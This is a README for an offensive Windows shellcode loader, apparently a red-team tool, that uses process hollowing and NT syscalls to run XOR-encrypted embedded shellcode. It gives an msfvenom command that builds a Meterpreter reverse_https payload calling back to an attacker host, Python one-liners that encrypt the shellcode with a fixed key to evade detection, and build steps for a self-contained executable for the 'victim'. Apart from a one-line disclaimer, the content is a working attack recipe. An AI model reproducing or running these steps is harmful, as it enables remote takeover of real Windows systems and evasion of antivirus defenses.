# 👻 Fantasma

> Windows shellcode loader using process hollowing and NT syscalls. Cross-compiled from macOS via .NET SDK. Shellcode is XOR-encrypted and embedded as a resource inside the binary.

---

## How It Works

```
msfvenom or the shellcode of your choice (raw staged shellcode)
        ↓
XOR encrypt (custom key)
        ↓
Embed as resource in .NET project
        ↓
dotnet publish → single .exe (win-x64)
        ↓
Execution: CreateProcess (suspended) → NtWriteVirtualMemory → NtCreateThreadEx
```

---
## Requirements
- macOS (Apple Silicon or Intel)
- [.NET SDK 8+](https://dot.net)
- `msfvenom` (Metasploit Framework)
- Python 3
---

## Usage
### 1. Generate the shellcode (Metasploit example)
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER_IP> LPORT=443 -f raw EXITFUNC=thread -o shellcode_enc.bin
```
### 2. XOR encrypt the shellcode
```bash
python3 -c "
data = open('shellcode_enc.bin','rb').read()
key = b'HFDG*febMXL@uX8YkkPhJof*'
enc = bytes([b ^ key[i % len(key)] for i,b in enumerate(data)])
open('shellcode_enc.bin','wb').write(enc)
print('First 4 encrypted:', hex(enc[0]), hex(enc[1]), hex(enc[2]), hex(enc[3]))"
```

### 3. Place the encrypted shellcode
Copy `shellcode_enc.bin` into the project root (alongside `fantasma.csproj`).

### 4. Build

**Single file 64-bit — self-contained (recommended, no .NET on victim):**
```bash
dotnet publish -r win-x64 -c Release --self-contained true -p:PublishSingleFile=true  -p:PublishTrimmed=true -o ./output
```

**32-bit (if needed):**
```bash
dotnet publish -r win-x86 -c Release --self-contained false
```
---

## Project Structure

```
fantasma/
├── fantasma.csproj
├── Program.cs
└── shellcode_enc.bin   ← generated per session, not committed
```
---

## Verify shellcode before building

```bash
python3 -c "
data  = open('shellcode_enc.bin','rb').read()
key   = b'HFDG*febMXL@uX8YkkPhJof*'
dec   = bytes([b ^ key[i % len(key)] for i,b in enumerate(data)])
print('Encrypted (on disk):', ' '.join(f'{b:02X}' for b in data[:4]))
print('Decrypted (runtime):', ' '.join(f'{b:02X}' for b in dec[:4]))
print('Expected:             FC 48 83 E4')
print('Match:', dec[:4] == bytes([0xfc,0x48,0x83,0xe4]))"
```

---
## Disclaimer

For authorized security testing and research only.

